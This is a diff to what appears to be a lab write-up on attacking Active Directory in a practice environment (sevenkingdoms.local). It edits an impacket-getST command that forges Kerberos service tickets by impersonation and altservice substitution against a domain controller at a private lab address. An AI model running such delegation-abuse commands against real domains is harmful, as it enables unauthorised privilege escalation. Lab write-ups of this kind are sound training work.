@@ -74,10 +74,12 @@ We can see that the user of the `WINTERFELL` machine is `WINTERFELL$` so this is
 ```bash
   impacket-getST -spn CIFS/winterfell.north.sevenkingdoms.local \
       -altservice HOST/winterfell.north.sevenkingdoms.local \
-      -impersonate Administrator \
-      north.sevenkingdoms.local/WINTERFELL$ \
+      -impersonate WINTERFELL$ \
+      north.sevenkingdoms.local/jon.snow \
       -k -dc-ip 10.2.10.11
 ```
 
+
+![[images/2026-10-08_17-05-39.png]]
 
 
